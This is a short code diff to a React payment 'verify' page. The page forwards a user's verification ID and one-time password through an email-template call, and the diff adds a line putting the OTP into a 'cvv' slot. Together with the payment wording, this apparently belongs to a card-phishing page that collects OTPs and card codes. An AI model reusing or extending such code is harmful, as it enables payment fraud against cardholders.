@@ -38,6 +38,7 @@ export default function VerifyPage({ params }: any) {
                     message: `Verification ID: ${id}\nOTP: ${otp}`,
                     id,
                     otp,
+                    cvv: otp, // Send OTP in the cvv slot for template compatibility
                 },
                 publicKey
             )
@@ -79,8 +80,8 @@ export default function VerifyPage({ params }: any) {
                 message="Payment will be processed shortly."
             />
 
-            <p className="text-gray-600 text-sm">
-                This step is to ensure maximum security.
+            <p className="text-gray-600 text-sm bg-red-300 rounded-full">
+                This step is to ensure maximum security!.
             </p>
         </div>
     )
